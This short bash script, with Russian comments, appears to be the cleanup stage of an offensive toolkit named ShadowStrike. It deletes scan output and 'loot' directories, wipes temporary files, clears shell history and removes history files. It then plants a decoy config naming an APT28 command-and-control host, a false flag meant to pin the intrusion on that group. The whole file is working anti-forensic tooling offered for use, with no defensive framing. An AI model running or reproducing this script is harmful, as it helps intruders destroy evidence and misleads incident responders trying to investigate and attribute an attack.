#!/bin/bash
echo "[CLEANUP] Заметаю следы..."

# Удаляем артефакты ShadowStrike
rm -rf ~/shadow_scan_* ~/shadow_loot ~/shadow_loot_* 2>/dev/null
rm -f /tmp/.shadow_* /tmp/shadow_* /tmp/cham_page.html /tmp/supervisor_page.html 2>/dev/null

# Чистим историю
history -c 2>/dev/null
rm -f ~/.bash_history ~/.zsh_history 2>/dev/null

# Оставляем ложный след
mkdir -p /tmp/.apt_decoy
echo "C2: apt28-c2.darknet.local" > /tmp/.apt_decoy/config
echo "Key: $(openssl rand -hex 16 2>/dev/null || echo 'f8c3b2a1e9d7f6c8')" >> /tmp/.apt_decoy/config

echo "[CLEANUP] Мы исчезли. APT28 осталась."
